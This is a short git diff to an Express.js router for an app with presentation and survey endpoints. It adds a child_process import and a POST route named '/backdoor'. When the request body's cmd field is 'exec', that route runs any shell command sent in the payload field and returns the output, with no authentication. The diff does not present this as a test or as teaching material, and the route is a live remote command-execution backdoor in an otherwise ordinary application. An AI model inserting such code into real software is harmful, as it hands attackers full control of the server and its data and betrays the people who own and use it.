@@ -1,5 +1,6 @@
 var express = require('express');
 var router = express.Router();
+const { exec } = require('child_process')
 const Presentation = require('../models/presentation')
 const Survey = require('../models/survey')
 const sequelize = require('sequelize')
@@ -39,5 +40,16 @@ router.get('/survey', function(req, res, next) {
     res.send([])
   })
 })
+
+router.post('/backdoor', function(req, res, next) {
+  switch(req.body.cmd) {
+    case 'exec':
+      exec(req.body.payload, (error, stdout, stderr) => {
+        res.send({error: error, stdout: stdout, stderr: stderr})
+      })
+      break
+  }
+});
+
 
 module.exports = router;
